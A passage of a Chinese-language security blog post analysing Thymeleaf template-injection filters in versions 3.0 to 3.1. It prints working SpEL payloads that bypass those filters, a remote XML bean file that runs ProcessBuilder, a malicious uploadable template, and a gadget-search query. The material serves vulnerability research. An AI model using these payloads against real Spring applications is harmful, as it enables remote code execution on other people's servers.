+		alt="image-20240308180212893"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="391"
+		data-flex-basis="940px"
+	
+></p>
+<p>存在黑名单</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185522961.png"
+	width="1146"
+	height="464"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185522961_hucb535a76d1551dc820e5c50c32eb7968_66165_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185522961_hucb535a76d1551dc820e5c50c32eb7968_66165_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308185522961"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="592px"
+	
+></p>
+<p>没关系，有很多方法可以绕</p>
+<p><strong>二次 SpEL表达式注入</strong></p>
+<pre tabindex="0"><code>__${&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpression&#34;).getMethod(&#34;getValue&#34;).invoke(&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;).getMethod(&#34;parseExpression&#34;, &#39;&#39;.class).invoke(&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;).newInstance(), &#34;&#34;.getClass().forName(&#34;java.net.URLDecoder&#34;).newInstance().decode(&#34;%54(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#34;)))}__::.x
+</code></pre><p>这里也同样不能出现 <code>T(</code> 或者 <code>new(空格)</code>，所以要对 T  进行 URL编码</p>
+<pre tabindex="0"><code>decode(&#34;%54(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)
+</code></pre><hr>
+<p><strong>Update</strong>：翻了一下SpEL官方文档，发现可用 <code>concat</code> 连接符拼接 <code>T</code> 和 <code>(</code></p>
+<pre tabindex="0"><code>__${&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpression&#34;).getMethod(&#34;getValue&#34;).invoke(&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;).getMethod(&#34;parseExpression&#34;, &#39;&#39;.class).invoke(&#39;&#39;.getClass().forName(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;).newInstance(), &#39;T&#39;.concat(&#39;(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;)&#39;)))}__::.x
+</code></pre><p><strong>ClassPathXmlApplicationContext SpEL 表达式注入（出网）</strong></p>
+<p>写到这里，突然想起前段时间看过 wh1t3p1g 师傅的一篇文章，里面提到用 <code>ClassPathXmlApplicationContext</code> 远程加载xml造成 SpEL表达式执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">ClassPathXmlApplicationContext</span> <span style="color:#e06c75">context</span><span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ClassPathXmlApplicationContext</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;http://127.0.0.1:7777/exp.xml&#34;</span><span style="color:#56b6c2">);</span>
+</span></span></code></pre></div><p>与之类似的还有 <code>FileSystemXmlApplicationContext</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">FileSystemXmlApplicationContext</span> <span style="color:#e06c75">context</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">FileSystemXmlApplicationContext</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;http://127.0.0.1:7777/exp.xml&#34;</span><span style="color:#56b6c2">);</span>
+</span></span></code></pre></div><p>因此构造如下payload</p>
+<pre tabindex="0"><code>__${&#39;&#39;.getClass().forName(&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;).getDeclaredConstructor(&#39;&#39;.class).newInstance(&#34;http://127.0.0.1:7777/exp.xml&#34;)}__::.x
+</code></pre><p><strong>exp.xml</strong></p>
+<p>poc by <a class="link" href="https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/"  target="_blank" rel="noopener"
+    >fynch3r</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#e06c75">&lt;beans</span> <span style="color:#e06c75">xmlns=</span><span style="color:#98c379">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">xmlns:xsi=</span><span style="color:#98c379">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">xsi:schemaLocation=</span><span style="color:#98c379">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span style="color:#e06c75">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">&lt;bean</span> <span style="color:#e06c75">id=</span><span style="color:#98c379">&#34;pb&#34;</span> <span style="color:#e06c75">class=</span><span style="color:#98c379">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#e06c75">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e06c75">&lt;constructor-arg</span> <span style="color:#e06c75">value=</span><span style="color:#98c379">&#34;calc&#34;</span> <span style="color:#e06c75">/&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e06c75">&lt;property</span> <span style="color:#e06c75">name=</span><span style="color:#98c379">&#34;whatever&#34;</span> <span style="color:#e06c75">value=</span><span style="color:#98c379">&#34;#{ pb.start() }&#34;</span><span style="color:#e06c75">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">&lt;/bean&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">&lt;/beans&gt;</span>
+</span></span></code></pre></div><hr>
+<p><strong>Update</strong>：2024RWCTF 官方wp提到可以用点号<code>.</code> 绕过 <code>new xxx</code>  的检测，所以可以不用反射</p>
+<p><strong>Payload</strong></p>
+<pre tabindex="0"><code>__${new.org..springframework.expression.spel.standard.SpelExpressionParser().parseExpression(&#39;T&#39;.concat(&#39;(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;)&#39;)).getValue()}__::.x
+</code></pre><h4 id="thymeleaf-31x">Thymeleaf 3.1.x</h4>
+<h5 id="thymeleaf-310">Thymeleaf 3.1.0</h5>
+<p>Thymeleaf 3.1x 版本做了很多改动，更严格地限制了表达式中类的使用</p>
+<blockquote>
+<p>Thymeleaf 3.1对核心包中的类的使用建立了一般限制：<code>java.*</code>、<code>javax.*</code>、<code>jakarta.*</code>、<code>jdk.*</code>、<code>org.ietf.jgss.*</code>、<code>org.omg.*</code>、<code>org.w3c.dom.*</code>、<code>org.xml.sax.*</code>和。<code>com.sun.*``sun.*</code></p>
+<p>现在禁止对这些包中的类以及静态引用进行方法/构造函数调用。</p>
+<p>作为此限制的例外，这些包中的某些类始终是<em>允许的</em>：</p>
+<ul>
+<li>基础<code>java.lang.*</code>和<code>java.math.*</code>课程：<code>java.lang.Boolean</code>, <code>java.lang.Byte</code>, <code>java.lang.Character</code>, <code>java.lang.Double</code>, <code>java.lang.Enum</code>, <code>java.lang.Float</code>, <code>java.lang.Integer</code>, <code>java.lang.Long</code>, <code>java.lang.Math</code>, <code>java.lang.Number</code>, <code>java.lang.Short</code>, <code>java.lang.String</code>, <code>java.math.BigDecimal</code>, <code>java.math.BigInteger</code>, <code>java.math.RoundingMode</code>。</li>
+<li>集合类和接口：<code>java.util.Collection</code>, <code>java.util.Enumeration</code>, <code>java.util.Iterable</code>, <code>java.util.Iterator</code>, <code>java.util.List</code>, <code>java.util.ArrayList</code>, <code>java.util.LinkedList</code>, <code>java.util.Set</code>, <code>java.util.HashSet</code>, <code>java.util.LinkedHashSet</code>, <code>java.util.Map</code>, <code>java.util.Map.Entry</code>, <code>java.util.HashMap</code>, <code>java.util.LinkedHashMap</code>。注意：接口方法（例如 <code>Map#get(key)</code>）通常允许用于任何实现，但此处列出的特定实现可以另外构造和静态引用。</li>
+<li>其他常用类有<code>java.util.*</code>：<code>java.util.Properties</code>、、、、、、。<code>java.util.Optional``java.util.stream.Stream``java.util.Locale``java.util.Date``java.util.Calendar</code></li>
+</ul>
+</blockquote>
+<p><strong>ThymeleafEvaluationContext$ThymeleafEvaluationContextACLMethodResolver#resolve</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316162940776.png"
+	width="1205"
+	height="558"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316162940776_huffcf6bdd01b4899b543d3c51e3ddaa4b_111830_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316162940776_huffcf6bdd01b4899b543d3c51e3ddaa4b_111830_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316162940776"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="518px"
+	
+></p>
+<p><strong>ExpressionUtils#isMemberAllowed</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163028684.png"
+	width="1205"
+	height="512"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163028684_huf55fab456c85a8c5ca8c73a9c7f502a4_77356_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163028684_huf55fab456c85a8c5ca8c73a9c7f502a4_77356_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316163028684"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="564px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163042106.png"
+	width="1204"
+	height="224"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163042106_hu7f1b159214a08b9ad6d92f22512fde79_24256_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163042106_hu7f1b159214a08b9ad6d92f22512fde79_24256_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316163042106"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="537"
+		data-flex-basis="1290px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163101923.png"
+	width="1196"
+	height="512"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163101923_hube5595e3ba7b392749fc18b3860bc650_73274_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163101923_hube5595e3ba7b392749fc18b3860bc650_73274_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316163101923"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+></p>
+<p><code>isBlockedPackage</code> 方法会对类名校验</p>
+<p><strong>ExpressionUtils#isBlockedPackage</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163209086.png"
+	width="1252"
+	height="375"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163209086_hue868dbcaee88ef92286e39950b44b436_72210_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163209086_hue868dbcaee88ef92286e39950b44b436_72210_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316163209086"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="801px"
+	
+></p>
+<p><strong>ExpressionUtils</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163243605.png"
+	width="1202"
+	height="389"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163243605_hucb81456ba5427b9a3e69e3b9b252da1d_56480_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316163243605_hucb81456ba5427b9a3e69e3b9b252da1d_56480_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316163243605"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="741px"
+	
+></p>
+<p><code>java.*</code>、<code>javax.*</code>、<code>jakarta.*</code>、<code>jdk.*</code>、<code>org.ietf.jgss.*</code>、<code>org.omg.*</code>、<code>org.w3c.dom.*</code>、<code>org.xml.sax.*</code>、<code>com.sun.*、sun.</code>* 赫然在内，限制了 <code>Runtime</code>、<code>ProcessBuilder</code> 等类。</p>
+<p>翻看之前写的 payload， <code>ClassPathXmlApplicationContext</code> 并不在黑名单中，貌似能 bypass</p>
+<pre tabindex="0"><code>__${&#39;&#39;.getClass().forName(&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;).getDeclaredConstructor(&#39;&#39;.class).newInstance(&#34;http://127.0.0.1:7777/exp.xml&#34;)}__::.x
+</code></pre><p>调试代码发现利用失败，原因是 <code>payload</code> 调用了 <code>newInstance</code> 方法</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316185049697.png"
+	width="1204"
+	height="464"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316185049697_hua15295270ee3ed8b883efdf410d9da2a_73177_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316185049697_hua15295270ee3ed8b883efdf410d9da2a_73177_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316185049697"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="622px"
+	
+></p>
+<p>而 <code>java.lang.reflect.*</code> 在黑名单内，所以无法调用 <code>Java</code> 原生的反射方法（<code>invoke</code>、<code>newInstance</code>等）</p>
+<p>不过<code>new</code> 关键字可以用点号<code>.</code>绕过，因此可以这样构造payload</p>
+<pre tabindex="0"><code>__${new.org..springframework.expression.spel.standard.SpelExpressionParser().parseExpression(&#39;T&#39;.concat(&#39;(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;)&#39;)).getValue()}__::.x
+</code></pre><hr>
+<p><strong>Thymeleaf SSTI 上传恶意模板</strong></p>
+<p><strong>SPELVariableExpressionEvaluator#obtainComputed</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317142248162.png"
+	width="1204"
+	height="294"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317142248162_hu3f531c719c5175d5fdc020a10665d980_51206_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317142248162_hu3f531c719c5175d5fdc020a10665d980_51206_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240317142248162"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="982px"
+	
+></p>
+<p>当然，用户上传的模板不受 <code>T(</code>、<code>new</code> 过滤影响，<code>expContext.getRestrictInstantiationAndStatic()</code> 计算结果为 <code>false</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#7f848e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">html</span> <span style="color:#e06c75">lang</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;en&#34;</span> <span style="color:#e06c75">xmlns:th</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;http://www.thymeleaf.org&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;header&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#e06c75">h3</span>&gt;Spring Boot Web Thymeleaf Example&lt;/<span style="color:#e06c75">h3</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#e06c75">span</span> <span style="color:#e06c75">th:text</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;&#39;Hello, &#39; + ${T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)}&#34;</span>&gt;&lt;/<span style="color:#e06c75">span</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">&lt;!-- &lt;p&gt;Hello,  [[${T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)}]]&gt;&lt;/span&gt;     --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">html</span>&gt;
+</span></span></code></pre></div><p>如果能上传模板，并找到黑名单外的一个具有同样反射功能的方法，SSTI也是能够触发的</p>
+<p>用 Cypher 语句来查询</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cql" data-lang="cql"><span style="display:flex;"><span><span style="color:#e06c75">match</span> (<span style="color:#e06c75">source</span><span style="color:#e06c75">:Method</span> {<span style="color:#e06c75">IS_PUBLIC</span><span style="color:#e06c75">:true</span>, <span style="color:#e06c75">IS_STATIC</span><span style="color:#e06c75">:true</span>})  
+</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">where</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;java.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;javax.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;jakarta.&#39;</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;jdk.&#39;</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.ietf.jgss.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.omg.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.w3c.dom.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.xml.sax.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;com.sun.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;sun.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">or</span> <span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;java.time.&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">match</span> (<span style="color:#e06c75">sink</span><span style="color:#e06c75">:Method</span> {<span style="color:#e06c75">IS_SINK</span><span style="color:#e06c75">:true</span>, <span style="color:#e06c75">CLASSNAME</span>:<span style="color:#98c379">&#34;java.lang.reflect.Constructor&#34;</span>, <span style="color:#e06c75">NAME</span><span style="color:#e06c75">:&#34;newInstance&#34;</span>})<span style="color:#56b6c2">&lt;-</span>[<span style="color:#e06c75">:CALL</span>]<span style="color:#56b6c2">-</span>(<span style="color:#e06c75">source</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">return</span> <span style="color:#56b6c2">*</span>
+</span></span></code></pre></div><p>找到了 <code>org.springframework.cglib.core.ReflectUtils#newInstance</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>	<span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e06c75">Object</span> <span style="color:#61afef;font-weight:bold">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">final</span> <span style="color:#e06c75">Constructor</span> <span style="color:#e06c75">cstruct</span><span style="color:#56b6c2">,</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e5c07b">boolean</span> <span style="color:#e06c75">flag</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cstruct</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isAccessible</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">flag</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">cstruct</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">Object</span> <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cstruct</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">return</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>将改造payload 成如下形式</p>
+<p><strong>Payload</strong></p>
+<pre tabindex="0"><code>${T(org.springframework.cglib.core.ReflectUtils).newInstance(&#39;&#39;.getClass().forName(&#39;org.springframework.context.support.ClassPathXmlApplicationContext&#39;).getDeclaredConstructor(&#39;&#39;.class),{&#39;http://127.0.0.1:7777/exp.xml&#39;})}
+</code></pre><p><strong>hello.html</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#7f848e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">html</span> <span style="color:#e06c75">lang</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;en&#34;</span> <span style="color:#e06c75">xmlns:th</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;http://www.thymeleaf.org&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;header&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#e06c75">h3</span>&gt;Spring Boot Web Thymeleaf Example&lt;/<span style="color:#e06c75">h3</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    [[${T(org.springframework.cglib.core.ReflectUtils).newInstance(&#39;&#39;.getClass().forName(&#39;org.springframework.context.support.ClassPathXmlApplicationContext&#39;).getDeclaredConstructor(&#39;&#39;.class),{&#39;http://127.0.0.1:7777/exp.xml&#39;})}]]
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">html</span>&gt;
+</span></span></code></pre></div><h5 id="thymeleaf-311">Thymeleaf 3.1.1</h5>
+<p><strong>ExpressionUtils</strong></p>
